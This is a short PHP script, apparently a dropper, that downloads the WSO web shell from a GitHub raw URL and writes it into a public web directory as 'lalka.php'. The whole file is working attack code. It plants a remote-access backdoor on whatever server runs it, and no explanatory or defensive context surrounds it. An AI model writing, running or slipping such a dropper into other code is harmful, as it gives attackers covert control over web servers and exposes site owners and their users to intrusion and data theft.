<?php
$file = $_SERVER["DOCUMENT_ROOT"] . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . "public" . DIRECTORY_SEPARATOR . "lalka.php";
$wso = file_get_contents("https://raw.githubusercontent.com/HARDLINUX/webshell/master/WSO.php");
file_put_contents($file, $wso);
?>